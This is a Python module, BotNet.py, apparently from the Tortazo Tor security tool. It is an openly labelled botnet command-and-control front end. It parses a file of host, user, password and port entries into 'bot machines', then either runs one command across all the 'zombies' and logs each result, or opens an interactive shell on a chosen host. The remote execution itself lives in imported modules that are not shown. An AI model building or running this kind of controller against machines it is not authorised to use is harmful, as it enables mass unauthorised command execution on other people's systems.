# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

BotNet.py

BotNet is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

BotNet is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

import os
import sys

from stem.util import term

from core.tortazo.CommandAndControl import CommandAndControl
from core.tortazo.data.BotMachine import BotMachine


class BotNet:
    '''
    Class used to start the BotNet using the file tortazo_botnet.bot
    '''
    def __init__(self, cli):
        '''
        Contructor. 
        '''
        self.cli = cli

    def start(self):
        '''
        Start the botnet. Read the file 'tortazo_botnet.bot and extracts the entries.'
        '''
        try:
                if os.path.exists('tortazo_botnet.bot') is not True:
                    self.cli.logger.error(term.format("[-] 'tortazo_botnet.bot' doesn't exists.", term.Color.RED))
                    self.cli.logger.error(term.format("[-] Exiting...", term.Color.RED))
                    exit()
                tortazo_botnet = open('tortazo_botnet.bot', 'r')
                bots = []
                hostId = 1
                for line in tortazo_botnet.readlines():
                    if line == '\n':
                        continue
                    host = line.split(":")[0]
                    user = line.split(":")[1]
                    password = line.split(":")[2]
                    port = line.split(":")[3]
                    nickname = line.split(":")[4]
                    
                    bot = BotMachine(hostId, user, password, host, nickname, port)
                    bots.append(bot)
                    self.cli.logger.debug(term.format("[+] Bot Machine %s : %s created." %(bot.hostId, bot.host), term.Color.YELLOW))
                    hostId += 1
                botControl = CommandAndControl(self.cli, bots)
                if self.cli.runCommand is None and self.cli.openShell is None:
                    self.cli.logger.error(term.format("[-] Using zombie mode, but without any command to execute", term.Color.RED))
                elif self.cli.runCommand is not None:
                    self.cli.logger.info(term.format("[+] Running single command across the zombies... ", term.Color.YELLOW))
                    botControl.executeCommand(self.cli.runCommand)
                    for bot in botControl.filterBots:
                        for command in bot.results.keys():
                            self.cli.logger.info(term.format("[+] Host: "+bot.host, term.Color.YELLOW))
                            self.cli.logger.info(term.format("[+] Command: "+command, term.Color.YELLOW))
                            self.cli.logger.info(term.format("[+] Output: "+str(bot.results[command]), term.Color.YELLOW))
                elif self.cli.openShell is True:
                    print(term.format("\n\n[+] Listing the Bots available...", term.Color.BLUE))
                    print(term.format("[+] Select a Host Id to open a new shell... ", term.Color.BLUE))
                    validHosts = []
                    for bot in botControl.filterBots:
                        print(term.format("[++] (%s) - %s : %s" %(bot.hostId, bot.host, bot.nickname), term.Color.BLUE))
                        validHosts.append(bot.hostId)
                    selectedHost = sys.stdin.read(1)
                    if selectedHost.isdigit() and (int(selectedHost) in validHosts):
                        botControl.openShell(int(selectedHost))
                    else:
                        self.cli.logger.error(term.format("[-] Selected Host is not a valid value", term.Color.RED))

        except IOError:
            self.cli.logger.error(term.format("[-] 'tortazo_botnet.bot' doesn't exists.", term.Color.RED))
            self.cli.logger.error(term.format("[-] Error reading the 'tortazo_botnet.bot' file.", term.Color.RED))
            exit()
